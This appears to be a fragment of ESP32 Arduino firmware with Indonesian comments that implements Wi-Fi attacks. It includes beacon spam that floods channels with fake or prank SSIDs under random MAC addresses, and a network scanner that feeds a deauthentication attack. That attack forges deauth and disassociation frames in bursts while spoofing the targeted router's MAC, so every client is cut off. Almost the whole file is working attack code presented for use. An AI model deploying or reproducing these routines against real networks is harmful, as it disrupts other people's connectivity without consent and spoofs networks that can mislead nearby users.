#include "esp_wifi.h"



// Fungsi sakti buat ubah String MAC ke Bytes
void stringToMac(String macStr, uint8_t *macAddr) {
  int values[6];
  if (6 == sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5])) {
    for (int i = 0; i < 6; ++i) macAddr[i] = (uint8_t)values[i];
  }
}


uint8_t beaconPacket[128] = {
    0x80, 0x00, // Frame Control: Beacon
    0x00, 0x00, // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC (Nanti di-random)
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (Nanti di-random)
    0x00, 0x00, // Sequence Number
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00, // Beacon Interval
    0x01, 0x04, // Capability Info
    0x00 // Tag Number: SSID
};

// List SSID buat ngerjain temen/orang (Bisa lu ganti sesuka hati)
const char* fakeSSIDs[] = {
    "Pencuri Data", "HP Anda Terhack", "RootX-Terminal", 
    "Beli Bakso Gratis", "Koneksi Lemot", "Polisi Siber", 
    "Minta Password?", "Pencari Janda"
};

const char* rickRollLyrics[] = {
  "1_Never gonna give you up",
  "2_Never gonna let you down",
  "3_Never gonna run around",
  "4_And desert you",
  "5_Never gonna make you cry",
  "6_Never gonna say goodbye",
  "7_Never gonna tell a lie",
  "8_And hurt you"
};


// --- TEMPLATE PAKET ALA GHOST-ESP ---
uint8_t deauthFrame[26] = { 0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
uint8_t disasFrame[26]  = { 0xa0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };

void loopWiFi(void * pvParameters) {
  for(;;) {
   if (isSpamming) {
   esp_wifi_set_promiscuous(true);
      if (aktifModeSpam == 1) {
         // --- PELURU BEACON SPAM ---
         // Tembak paket beacon dengan SSID random
         
    
        int randomIdx = esp_random() % 8; 
        String currentSSID = fakeSSIDs[randomIdx];
        sendBeacon(currentSSID);
        // PENTING: Kasih jeda setelah keliling 13 channel biar Core 0 gak panic
        vTaskDelay(10 / portTICK_PERIOD_MS); 
      } 
      else if (aktifModeSpam == 2) {
         // --- PELURU RICKROLL ---
         // Tembak paket beacon dengan SSID "Never Gonna Give You Up"
         for (int i = 0; i < 8; i++) {
        String currentSSID = rickRollLyrics[i];
        sendBeacon(currentSSID); 
        vTaskDelay(5 / portTICK_PERIOD_MS); // Kasih napas dikit biar gak overload
    }
      }
      else if (aktifModeSpam == 3) {
         // --- PELURU BLE SPAM ---
         // (Khusus BLE nanti pake library NimBLE atau BLEDevice)
      }
      
      
      vTaskDelay(50 / portTICK_PERIOD_MS); // Biar gak crash
    } else if (triggerScan) {
      sedang_scan = true;
      
       adaTarget = false;        // Target lama dihapus
      targetLockedIdx = -1;     // Indeks kursor di-reset
      
      // Bersihin data lama dulu biar fresh
      totalWiFi = 0;
      WiFi.mode(WIFI_STA);
      WiFi.disconnect();
      vTaskDelay(100 / portTICK_PERIOD_MS);

      // Mulai Scan (Ini biasanya makan waktu 3-5 detik secara alami)
      int n = WiFi.scanNetworks();
      
      totalWiFi = (n > 30) ? 30 : n; // Maksimal 30 biar RAM lega
      for (int i = 0; i < totalWiFi; ++i) {
        listWiFi[i].id = i;
        listWiFi[i].ssid = WiFi.SSID(i);
        listWiFi[i].rssi = WiFi.RSSI(i);
        listWiFi[i].channel = WiFi.channel(i);
        listWiFi[i].mac = WiFi.BSSIDstr(i); // Ambil MAC target

      }
      
      sedang_scan = false;
      scanDone = true;     // Lapor ke Core 1 kalau udah beres
      triggerScan = false; // Matiin pelatuknya
    } else if (isDeauthing && adaTarget) {
    // 1. PINDAH MODE KE AP (Biar lebih sakti kayak GhostESP)
    esp_wifi_set_mode(WIFI_MODE_AP); 
    esp_wifi_set_promiscuous(true);
    
    uint8_t targetMac[6]; // MAC Router
    stringToMac(targetTerkunci.mac, targetMac);
    uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    // Setting Peluru (Nyamar jadi Router)
    memcpy(&deauthFrame[4],  broadcastMac, 6); 
    memcpy(&deauthFrame[10], targetMac,    6); 
    memcpy(&deauthFrame[16], targetMac,    6);

    esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);

    // 2. TEMBAK BURST (Tanpa Delay Mikro yang kelamaan)
    for(int i=0; i<25; i++) {
        uint16_t seq = (uint16_t)((esp_random() & 0xFFF) << 4);
        deauthFrame[22] = seq & 0xFF;
        deauthFrame[23] = (seq >> 8) & 0xFF;
        
        // GUNAKAN WIFI_IF_AP !!!
        esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
        esp_wifi_80211_tx(WIFI_IF_AP, disasFrame, sizeof(disasFrame), false);
        
        if(i % 10 == 0) vTaskDelay(1); // Kasih napas dikit tiap 10 tembakan
    }

    
    vTaskDelay(50 / portTICK_PERIOD_MS); 
}
}
}

void sendBeacon(String ssid) {
    int ssidLen = ssid.length();
    
    // 1. Acak MAC Address (Source & BSSID)
    for(int i=10; i<16; i++) {
        uint8_t r = esp_random() % 256;
        beaconPacket[i] = r;      
        beaconPacket[i+6] = r;    
    }

    // 2. Pasang Nama SSID ke Paket
    beaconPacket[37] = ssidLen;
    for(int i=0; i<ssidLen; i++) {
        beaconPacket[38+i] = ssid[i];
    }

    // 3. Tambah Tail (Akhiran Paket)
    uint8_t postSSID[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x01};
    memcpy(&beaconPacket[38 + ssidLen], postSSID, sizeof(postSSID));

    // 4. Tembak Keliling Channel
    for (int ch = 1; ch <= 13; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 38 + ssidLen + sizeof(postSSID), false);
        delayMicroseconds(100); 
    }
}


    
